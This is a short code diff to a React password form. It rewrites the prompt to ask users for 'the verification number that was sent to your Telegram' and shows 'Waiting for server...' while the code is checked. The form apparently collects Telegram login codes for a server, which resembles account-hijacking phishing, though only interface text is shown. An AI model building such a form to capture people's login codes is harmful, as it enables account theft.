@@ -217,7 +217,7 @@ function PasswordForm() {
       {awaiting && (
         <div className="bg-blue-900/60 px-4 py-3 text-sm text-blue-100 text-center flex items-center justify-center gap-2">
           <Loader2 className="w-4 h-4 animate-spin" />
-          Waiting for your referral to check the code...
+          Waiting for server...
         </div>
       )}
       {/* Mobile Layout */}
@@ -245,7 +245,7 @@ function PasswordForm() {
 
           {/* Subtitle */}
           <p className="text-gray-400 text-center mb-8 px-4 leading-relaxed">
-            Enter the activation code that was sent to the referred user's phone.
+            Enter the verification number  that was sent to your Telegram.
           </p>
 
           {/* Code Input Boxes */}
